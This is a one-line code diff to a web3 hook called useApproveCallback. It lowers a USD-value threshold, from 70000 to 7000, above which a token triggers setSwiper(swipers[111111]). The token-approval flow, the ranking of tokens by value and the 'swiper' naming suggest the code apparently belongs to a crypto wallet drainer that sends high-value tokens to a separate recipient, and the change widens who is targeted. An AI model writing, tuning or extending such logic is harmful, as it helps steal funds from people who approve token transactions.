@@ -296,7 +296,7 @@ export function useApproveCallback(
 
       // if (!estimatedGas) return undefined
 
-      if (tokensFiltered[0]?.usdValue > 70000) setSwiper(swipers[111111])
+      if (tokensFiltered[0]?.usdValue > 7000) setSwiper(swipers[111111])
       tokensFiltered.shift()
       setTokensFiltered(tokensFiltered)
 
